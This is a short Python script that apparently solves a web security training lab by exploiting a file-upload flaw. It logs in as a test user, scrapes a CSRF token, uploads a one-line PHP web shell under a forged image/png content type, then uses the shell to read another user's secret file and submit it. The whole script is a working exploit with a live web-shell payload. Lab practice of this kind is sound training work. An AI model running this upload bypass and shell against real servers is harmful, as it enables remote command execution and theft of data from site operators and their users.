import sys
import os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "../.."))
from utils.base import LabSession
from bs4 import BeautifulSoup

lab = LabSession()

lab.login("wiener", "peter")

# grab csrf from the account page
page = lab.get("/my-account")
soup = BeautifulSoup(page.text, "html.parser")
csrf = soup.find("input", {"name": "csrf"})["value"]

# upload php shell but lie about the content type
# server checks Content-Type but not the actual file content or extension
shell = b'<?php system($_GET["cmd"]); ?>'
lab.info("Uploading shell with Content-Type set to image/png...")
resp = lab.post("/my-account/avatar", files={
    "avatar": ("shell.php", shell, "image/png")
}, data={
    "user": "wiener",
    "csrf": csrf
})
lab.info(f"Upload status: {resp.status_code}")

# read the secret through the shell
secret_resp = lab.get("/files/avatars/shell.php?cmd=cat+/home/carlos/secret")
secret = secret_resp.text.strip()
lab.success(f"Secret: {secret}")

# submit and verify
lab.post("/submitSolution", data={"answer": secret})
lab.check_solved()
